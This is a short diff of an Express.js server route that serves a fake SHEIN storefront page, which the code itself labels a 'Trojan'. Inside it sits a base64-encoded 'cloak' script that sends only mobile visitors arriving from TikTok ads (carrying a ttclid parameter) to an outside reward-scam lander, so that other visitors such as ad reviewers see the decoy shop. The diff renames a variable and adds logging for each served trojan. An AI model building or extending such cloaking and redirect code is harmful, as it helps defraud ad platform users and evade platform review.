@@ -3614,8 +3614,8 @@ Item added to your cart
 // SHEIN V4 SUB METHOD
 //         const isTok = /musical_ly|Bytedance|BytedanceWebview|ByteLocale/i.test(navigator.userAgent); && !isTok
 app.get('/shop', extractSubdomain, (req, res, next) => {
-    const sub = req.subdomain;
-    const lander = `https://tokreward.com/trshein.html?slug=${sub}`;
+    const slug = req.subdomain;
+    const lander = `https://tokreward.com/trshein.html?slug=${slug}`;
     const cloak = `
         const utm = new URLSearchParams(window.location.search);
         const ttclid = utm.get("ttclid");
@@ -3624,6 +3624,7 @@ app.get('/shop', extractSubdomain, (req, res, next) => {
         if (ttclid && mobile) { window.location.href = "${lander}"; } else { }
     `;
     const payload = base64Encode(cloak);
+    console.log(`Served SHEINV4 Trojan (${slug})`);
     const trojanHTML = `
    		<html class="js" lang="en" style="--header-height: 65px;"><head>
     <meta charset="utf-8">
